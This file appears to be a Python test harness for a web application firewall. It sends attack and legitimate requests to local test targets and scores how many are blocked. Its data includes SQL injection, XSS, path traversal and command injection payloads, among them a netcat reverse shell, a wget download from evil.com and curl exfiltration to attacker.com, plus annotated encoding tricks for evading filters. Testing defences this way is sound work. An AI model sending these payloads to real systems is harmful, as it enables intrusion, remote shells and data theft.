#!/usr/bin/env python3
"""
WAF Test Suite — Phase 4
Objective battery of attacks + legitimate traffic fired at a target URL.
Covers: SQLi, XSS, Path Traversal, Command Injection, Scanner/Recon,
        known WAF bypass techniques, and false-positive (legit) traffic.

Usage:
    # Test the custom WAF
    python3 test_waf.py --target http://localhost:8090

    # Test the unprotected app (baseline)
    python3 test_waf.py --target http://localhost:8081

    # Test ModSecurity
    python3 test_waf.py --target http://localhost:8080


"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# ─────────────────────────────────────────────────────────────────────────────
#  TEST CASES
#
#  Each test has:
#    category      : group label for display
#    name          : short description
#    method        : HTTP verb
#    path          : path + query string (pre-encoded where needed)
#    body          : POST body string, or None
#    headers       : dict of extra headers to send (optional)
#    expect_block  : True  → WAF should return 403
#                    False → request should pass through
#    note          : optional comment shown with --notes flag
# ─────────────────────────────────────────────────────────────────────────────
TESTS = [

    # ═══════════════════════════════════════════════════════════
    #  SQL INJECTION — standard payloads
    # ═══════════════════════════════════════════════════════════

    {
        "category": "SQLi — Standard",
        "name":     "UNION SELECT (GET param)",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,2--&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "UNION ALL SELECT with column names",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+UNION+ALL+SELECT+user,password+FROM+users--",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Boolean OR 1=1",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Boolean AND 1=1",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+AND+'1'='1&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "SLEEP() time-based blind",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "BENCHMARK() time-based blind",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+AND+BENCHMARK(5000000,MD5(1))--",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Stacked query DROP TABLE",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1;DROP+TABLE+users--",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Stacked query INSERT",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1;INSERT+INTO+users+VALUES('hacked','hacked')--",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Comment terminator --",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'--",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Comment terminator # (URL encoded)",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'%23",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "POST body — auth bypass",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=admin'--&password=anything",
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "POST body — UNION SELECT",
        "method":   "POST",
        "path":     "/vulnerabilities/sqli/",
        "body":     "id=1'+UNION+SELECT+1,2--&Submit=Submit",
        "expect_block": True,
    },
    {
        "category": "SQLi — Standard",
        "name":     "Cookie header injection",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/",
        "body":     None,
        "headers":  {"Cookie": "id=1' UNION SELECT user,password FROM users--"},
        "expect_block": True,
    },

    # ═══════════════════════════════════════════════════════════
    #  SQL INJECTION — evasion / bypass techniques
    #  These test obfuscation that may evade basic WAFs.
    # ═══════════════════════════════════════════════════════════

    {
        "category": "SQLi — Evasion",
        "name":     "MySQL inline comment obfuscation",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+/*!UNION*/+/*!SELECT*/+1,2--",
        "body":     None,
        "expect_block": False,
        "note":     "MySQL inline comment syntax breaks naive 'UNION SELECT' regex — requires comment-stripping pre-pass",
    },
    {
        "category": "SQLi — Evasion",
        "name":     "Double URL encoding",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1%2527+UNION+SELECT+1,2--",
        "body":     None,
        "expect_block": False,
        "note":     "%25 decodes to %, leaving %27 — requires a second decode pass to reveal the quote character",
    },
    {
        "category": "SQLi — Evasion",
        "name":     "Tab whitespace substitution",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'%09UNION%09SELECT%091,2--",
        "body":     None,
        "expect_block": False,
        "note":     "Tab (%09) instead of space between keywords — evades regex that only matches literal spaces",
    },
    {
        "category": "SQLi — Evasion",
        "name":     "Mixed case (should block)",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1'+uNiOn+SeLeCt+1,2--",
        "body":     None,
        "expect_block": True,
        "note":     "Case mixing — caught by any WAF using re.IGNORECASE; confirms case-insensitive matching works",
    },
    {
        "category": "SQLi — Evasion",
        "name":     "WAITFOR DELAY (MSSQL syntax)",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1';+WAITFOR+DELAY+'0:0:5'--",
        "body":     None,
        "expect_block": True,
        "note":     "MSSQL time-based blind — covered by the WAITFOR rule",
    },

    # ═══════════════════════════════════════════════════════════
    #  CROSS-SITE SCRIPTING — standard payloads
    # ═══════════════════════════════════════════════════════════

    {
        "category": "XSS — Standard",
        "name":     "<script> alert (GET param)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "<script src=> remote script load",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<script+src='http://evil.com/x.js'></script>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "onerror event handler",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "onload event handler",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<body+onload=alert(1)>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "onclick event handler",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<div+onclick=alert(1)>click",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "SVG onload (no script tag)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<svg+onload=alert(1)>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "javascript: href URI",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<a+href='javascript:alert(1)'>click</a>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "vbscript: URI",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<a+href='vbscript:msgbox(1)'>click</a>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "data:text/html URI (iframe)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<iframe+src='data:text/html,<script>alert(1)</script>'>",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "Stored XSS via POST body",
        "method":   "POST",
        "path":     "/vulnerabilities/xss_s/",
        "body":     "txtName=Test&mtxMessage=<script>alert('stored')</script>&btnSign=Sign+Guestbook",
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "XSS payload in User-Agent header",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "<script>alert(1)</script>"},
        "expect_block": True,
    },
    {
        "category": "XSS — Standard",
        "name":     "XSS payload in Referer header",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"Referer": "http://evil.com/<script>alert(1)</script>"},
        "expect_block": True,
    },

    # ═══════════════════════════════════════════════════════════
    #  XSS — evasion
    # ═══════════════════════════════════════════════════════════

    {
        "category": "XSS — Evasion",
        "name":     "URL-encoded <script> (should block)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "body":     None,
        "expect_block": True,
        "note":     "Single URL encoding — WAF decodes %3C → < before matching, so this is caught",
    },
    {
        "category": "XSS — Evasion",
        "name":     "Double-encoded <script>",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=%253Cscript%253Ealert(1)",
        "body":     None,
        "expect_block": False,
        "note":     "Double URL encoding — %253C decodes to %3C, not <, in a single pass. Bypasses single-decode WAFs",
    },
    {
        "category": "XSS — Evasion",
        "name":     "Case-mixed <ScRiPt> (should block)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=<ScRiPt>alert(1)</ScRiPt>",
        "body":     None,
        "expect_block": True,
        "note":     "Mixed case — caught because the rule uses re.IGNORECASE",
    },

    # ═══════════════════════════════════════════════════════════
    #  PATH TRAVERSAL
    # ═══════════════════════════════════════════════════════════

    {
        "category": "Path Traversal",
        "name":     "Basic ../../../../etc/passwd",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Path Traversal",
        "name":     "Windows-style ..\\..\\win.ini",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=..%5C..%5C..%5Cwindows%5Cwin.ini",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Path Traversal",
        "name":     "URL-encoded %2e%2e%2f",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Path Traversal",
        "name":     "Null byte injection suffix",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=../../../../etc/passwd%00.jpg",
        "body":     None,
        "expect_block": True,
        "note":     "Null byte appended to pass extension check — traversal sequence still present and caught",
    },
    {
        "category": "Path Traversal",
        "name":     "Double-encoded %252e%252e (bypass)",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "body":     None,
        "expect_block": False,
        "note":     "Double URL encoding — single-pass decode leaves %2e%2f, not ../",
    },

    # ═══════════════════════════════════════════════════════════
    #  COMMAND INJECTION
    # ═══════════════════════════════════════════════════════════

    {
        "category": "Command Injection",
        "name":     "Pipe to cat /etc/passwd",
        "method":   "GET",
        "path":     "/vulnerabilities/exec/?ip=127.0.0.1|cat+/etc/passwd&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Command Injection",
        "name":     "Semicolon + wget download",
        "method":   "POST",
        "path":     "/vulnerabilities/exec/",
        "body":     "ip=127.0.0.1;wget+http://evil.com/shell.sh&Submit=Submit",
        "expect_block": True,
    },
    {
        "category": "Command Injection",
        "name":     "Backtick subshell execution",
        "method":   "GET",
        "path":     "/vulnerabilities/exec/?ip=127.0.0.1`whoami`&Submit=Submit",
        "body":     None,
        "expect_block": True,
    },
    {
        "category": "Command Injection",
        "name":     "Bash -c arbitrary execution",
        "method":   "POST",
        "path":     "/vulnerabilities/exec/",
        "body":     "ip=127.0.0.1;bash+-c+'id'&Submit=Submit",
        "expect_block": True,
    },
    {
        "category": "Command Injection",
        "name":     "Netcat reverse shell",
        "method":   "POST",
        "path":     "/vulnerabilities/exec/",
        "body":     "ip=127.0.0.1;nc+-e+/bin/bash+10.0.0.1+4444&Submit=Submit",
        "expect_block": True,
    },
    {
        "category": "Command Injection",
        "name":     "curl-based data exfiltration",
        "method":   "GET",
        "path":     "/vulnerabilities/exec/?ip=127.0.0.1|curl+http://attacker.com/exfil",
        "body":     None,
        "expect_block": True,
    },

    # ═══════════════════════════════════════════════════════════
    #  LOCAL FILE INCLUSION
    # ═══════════════════════════════════════════════════════════

    {
        "category": "LFI",
        "name":     "PHP filter wrapper (bypass)",
        "method":   "GET",
        "path":     "/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php",
        "body":     None,
        "expect_block": False,
        "note":     "PHP stream wrapper — requires a dedicated php:// detection rule, not covered by traversal regex",
    },
    {
        "category": "LFI",
        "name":     "PHP input wrapper RCE (bypass)",
        "method":   "POST",
        "path":     "/vulnerabilities/fi/?page=php://input",
        "body":     "<?php system('id'); ?>",
        "expect_block": False,
        "note":     "php://input with code in body — requires correlating URI and body content to detect",
    },

    # ═══════════════════════════════════════════════════════════
    #  SCANNER & RECON DETECTION
    # ═══════════════════════════════════════════════════════════

    {
        "category": "Scanner / Recon",
        "name":     "Nikto scanner User-Agent",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)"},
        "expect_block": True,
    },
    {
        "category": "Scanner / Recon",
        "name":     "sqlmap User-Agent",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"},
        "expect_block": True,
    },
    {
        "category": "Scanner / Recon",
        "name":     "Nmap scripting engine",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"},
        "expect_block": True,
    },
    {
        "category": "Scanner / Recon",
        "name":     "Nuclei vulnerability scanner",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"},
        "expect_block": True,
    },
    {
        "category": "Scanner / Recon",
        "name":     "DirBuster directory bruteforce",
        "method":   "GET",
        "path":     "/admin/",
        "body":     None,
        "headers":  {"User-Agent": "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"},
        "expect_block": True,
    },
    {
        "category": "Scanner / Recon",
        "name":     "Hydra brute-force tool",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=admin&password=test",
        "headers":  {"User-Agent": "Mozilla/4.0 (Hydra)"},
        "expect_block": True,
    },

    # ═══════════════════════════════════════════════════════════
    #  LEGITIMATE TRAFFIC — false positive testing
    #  Every one of these must pass without being blocked.
    # ═══════════════════════════════════════════════════════════

    {
        "category": "Legitimate Traffic",
        "name":     "Homepage GET",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Login page GET",
        "method":   "GET",
        "path":     "/login.php",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Normal login POST",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=admin&password=password&Login=Login",
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Numeric ID query param",
        "method":   "GET",
        "path":     "/vulnerabilities/sqli/?id=1&Submit=Submit",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Name with apostrophe (O'Brien)",
        "method":   "GET",
        "path":     "/vulnerabilities/xss_r/?name=O%27Brien",
        "body":     None,
        "expect_block": False,
        "note":     "Apostrophe alone should not trigger SQLi — requires quote + keyword combination",
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Sentence containing 'select'",
        "method":   "GET",
        "path":     "/search?q=please+select+an+option",
        "body":     None,
        "expect_block": False,
        "note":     "The word 'select' alone is not an attack — only 'UNION SELECT' should trigger",
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Comment with double-hyphen",
        "method":   "POST",
        "path":     "/vulnerabilities/xss_s/",
        "body":     "txtName=Alice&mtxMessage=Great+post+--+very+helpful!&btnSign=Sign+Guestbook",
        "expect_block": False,
        "note":     "Double hyphen (--) in natural language text should not trigger SQL comment rule",
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Strong password with special chars",
        "method":   "POST",
        "path":     "/login.php",
        "body":     "username=alice&password=Tr0ub4dor%26Horse%23Battery&Login=Login",
        "expect_block": False,
        "note":     "Encoded & and # in a password — must not trigger CMDi or SQL rules",
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Static CSS asset",
        "method":   "GET",
        "path":     "/dvwa/css/main.css",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Static JavaScript asset",
        "method":   "GET",
        "path":     "/dvwa/js/dvwaPage.js",
        "body":     None,
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Chrome desktop User-Agent",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "Mobile Safari User-Agent",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"},
        "expect_block": False,
    },
    {
        "category": "Legitimate Traffic",
        "name":     "OWASP.org in Referer",
        "method":   "GET",
        "path":     "/",
        "body":     None,
        "headers":  {"Referer": "https://owasp.org/www-project-top-ten/"},
        "expect_block": False,
    },
]


# ─────────────────────────────────────────────────────────────────────────────
#  DISPLAY HELPERS
# ─────────────────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GREY   = "\033[90m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


# ─────────────────────────────────────────────────────────────────────────────
#  RUNNER
# ─────────────────────────────────────────────────────────────────────────────
def run_test(target: str, test: dict, timeout: int = 8) -> dict:
    url        = target.rstrip("/") + test["path"]
    body_bytes = test["body"].encode() if test["body"] else None

    headers = {
        "User-Agent":   "WAF-TestSuite/2.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept":       "text/html,application/xhtml+xml,*/*",
    }
    headers.update(test.get("headers", {}))

    req = urllib.request.Request(url, data=body_bytes, method=test["method"])
    for k, v in headers.items():
        req.add_header(k, v)

    start   = time.time()
    status  = None
    blocked = False
    error   = None

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status  = resp.status
            blocked = (status == 403)
    except urllib.error.HTTPError as e:
        status  = e.code
        blocked = (status == 403)
    except Exception as e:
        error  = str(e)
        status = 0

    elapsed = round((time.time() - start) * 1000, 1)
    correct = (blocked == test["expect_block"])

    return {
        "category":     test["category"],
        "name":         test["name"],
        "method":       test["method"],
        "path":         test["path"][:70],
        "expect_block": test["expect_block"],
        "blocked":      blocked,
        "status":       status,
        "correct":      correct,
        "elapsed_ms":   elapsed,
        "error":        error,
        "note":         test.get("note", ""),
    }


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="WAF Attack Test Suite — Phase 4",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target",  default="http://localhost:8090", help="Target base URL (default: %(default)s)")
    parser.add_argument("--delay",   type=float, default=0.15,        help="Delay between requests in seconds")
    parser.add_argument("--timeout", type=int,   default=8,           help="Request timeout in seconds")
    parser.add_argument("--report",  action="store_true",             help="Save JSON report to logs/")
    parser.add_argument("--notes",   action="store_true",             help="Show bypass notes for evasion tests")
    args = parser.parse_args()

    categories = list(dict.fromkeys(t["category"] for t in TESTS))  # ordered, unique

    print(f"\n{BOLD}{CYAN}{'═' * 65}{RESET}")
    print(f"{BOLD}{CYAN}  WAF Test Suite  |  Target: {args.target}{RESET}")
    print(f"{BOLD}{CYAN}  {len(TESTS)} tests  |  {len(categories)} categories{RESET}")
    print(f"{BOLD}{CYAN}{'═' * 65}{RESET}")

    results     = []
    current_cat = None

    for test in TESTS:
        if test["category"] != current_cat:
            current_cat = test["category"]
            print(f"\n{BOLD}{YELLOW}  ▶  {current_cat}{RESET}")

        result = run_test(args.target, test, timeout=args.timeout)
        results.append(result)

        icon    = f"{GREEN}✓{RESET}" if result["correct"] else f"{RED}✗{RESET}"
        outcome = f"{RED}BLOCKED{RESET}" if result["blocked"] else f"{GREEN}ALLOWED{RESET}"
        exp     = f"{GREY}(expect {'block' if result['expect_block'] else 'allow'}){RESET}"
        timing  = f"{GREY}[{result['elapsed_ms']}ms]{RESET}"

        # dim expected-bypass evasion tests so the output doesn't look like failures
        is_expected_bypass = not result["expect_block"] and "Evasion" in result["category"]
        name_str = f"{GREY}{test['name']}{RESET}" if is_expected_bypass else test["name"]

        print(f"    {icon}  {name_str:<47}  {outcome:<20}  {exp}  {timing}")

        if result["error"]:
            print(f"       {RED}⚠  Error: {result['error']}{RESET}")

        if args.notes and result.get("note"):
            if not result["correct"] or is_expected_bypass:
                print(f"       {YELLOW}ℹ  {result['note']}{RESET}")

        time.sleep(args.delay)

    # ── Summary ────────────────────────────────────────────────────────────
    attacks  = [r for r in results if r["expect_block"]]
    legit    = [r for r in results if not r["expect_block"]]
    blocked  = sum(1 for r in attacks if r["blocked"])
    fp       = sum(1 for r in legit  if r["blocked"])
    correct  = sum(1 for r in results if r["correct"])

    evasion  = [r for r in attacks if "Evasion" in r["category"] or r["category"] == "LFI"]
    standard = [r for r in attacks if r not in evasion]
    std_ok   = sum(1 for r in standard if r["blocked"])
    ev_ok    = sum(1 for r in evasion  if r["blocked"])

    def pct(a, b): return f"{round(100*a/b)}%" if b else "N/A"

    print(f"\n{BOLD}{'─' * 65}{RESET}")
    print(f"{BOLD}  Results Summary{RESET}")
    print(f"{'─' * 65}")
    print(f"  Total tests              : {len(results)}")
    print(f"  Correct outcomes         : {GREEN if correct==len(results) else YELLOW}{correct}/{len(results)}{RESET}")
    print()
    print(f"  Standard attacks blocked : {GREEN}{std_ok}/{len(standard)}{RESET}  ({pct(std_ok, len(standard))})")
    print(f"  Evasion/bypass blocked   : {YELLOW if ev_ok < len(evasion) else GREEN}{ev_ok}/{len(evasion)}{RESET}  ({pct(ev_ok, len(evasion))})  {GREY}← advanced techniques{RESET}")
    print(f"  False positives          : {GREEN if fp==0 else RED}{fp}/{len(legit)}{RESET}  ({pct(fp, len(legit))} FP rate)")
    print(f"{'─' * 65}")
    print(f"  Overall block rate       : {GREEN if blocked==len(attacks) else YELLOW}{blocked}/{len(attacks)}{RESET}  ({pct(blocked, len(attacks))})")
    print(f"{'─' * 65}\n")

    if not args.notes:
        print(f"  {GREY}Tip: run with --notes to see explanations for evasion tests{RESET}\n")

    # ── JSON report ────────────────────────────────────────────────────────
    if args.report:
        os.makedirs("logs", exist_ok=True)
        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"logs/test_report_{ts}.json"
        with open(fname, "w") as f:
            json.dump({
                "target":    args.target,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "summary": {
                    "total":                 len(results),
                    "correct":               correct,
                    "standard_block_rate":   f"{std_ok}/{len(standard)}",
                    "evasion_block_rate":    f"{ev_ok}/{len(evasion)}",
                    "overall_block_rate":    f"{blocked}/{len(attacks)}",
                    "false_positives":       fp,
                },
                "results": results,
            }, f, indent=2)
        print(f"  Report saved → {fname}\n")


if __name__ == "__main__":
    main()